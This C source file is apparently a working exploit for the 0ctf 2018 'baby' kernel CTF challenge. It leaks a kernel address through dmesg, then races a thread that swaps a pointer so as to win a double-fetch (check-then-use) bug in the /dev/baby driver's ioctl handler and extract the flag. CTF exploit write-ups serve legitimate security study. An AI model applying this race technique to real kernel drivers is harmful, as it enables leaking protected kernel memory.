/*************************************************************
 * File Name: exp_double_fetch.c
 * 
 * Created on: 2019-10-12 21:55:17
 * Author: raycp
 * 
 * Last Modified: 2019-10-13 03:42:23
 * Description: exp for 0ctf 2018 final baby, double fetch vuln.
************************************************************/

#include<stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <string.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdbool.h>

struct user_data
{
    char *flag_ptr;
    uint32_t len;
            
};

#define LEN 0x1000
#define TRYTIME 0x1000

char FLAG[]= "flag{1111_2222_33_4444_5555_6666}";
uint64_t global_flag_addr;
bool finish = false;
void die(const char* msg)
{
    perror(msg);
    exit(-1);        
}

uint64_t get_flag_addr()
{
    char buff[LEN];
    char *ptr;
    uint64_t flag_addr = 0;
    system("dmesg > /tmp/dmesg.txt");

    int fd = open("/tmp/dmesg.txt", O_RDONLY);
    if (fd == -1)
        die("open /tmp/dmesg.txt error");
    lseek(fd, -LEN, SEEK_END);
    read(fd, buff, LEN);
    close(fd);

    ptr =  strstr(buff, "Your flag is at ");
    if( ptr == 0 ){
        die("no flag addr");
    }
    else {
        ptr = ptr + strlen("Your flag is at ");
        flag_addr = strtoull(ptr, ptr+16, 16);
    }

    return flag_addr;
}

void change_flag_addr(void* flag_info)
{
    struct user_data* ptr = (struct user_data*)flag_info;

    while(finish == false) {
        ptr->flag_ptr = (char*)global_flag_addr;
    }

    return;
}
int main()
{
    struct user_data flag_info;
    pthread_t evil_thread;
    uint32_t i;
    //step 1 open the device
   int fd = open("/dev/baby", O_RDWR);
   if (fd == -1)
       die("open dev error");

   //step2 get the flag addr
   ioctl(fd, 0x6666);

   global_flag_addr =  get_flag_addr();
   if(global_flag_addr == 0 ){
       die("flag addr 0");
   }
   printf("flag addr: %lp\n", global_flag_addr);

   flag_info.flag_ptr = FLAG;
   flag_info.len = 33;

    //step 3 trigger double fetch
   pthread_create(&evil_thread, NULL, change_flag_addr, &flag_info);
   for( i=0; i<TRYTIME; i++ ){
        ioctl(fd, 0x1337, &flag_info);
        flag_info.flag_ptr = FLAG; 
   }
   finish = true;

   pthread_join(evil_thread, NULL);
   close(fd);
   puts("flag is :");
   system("dmesg | grep flag");

   return 0;
}
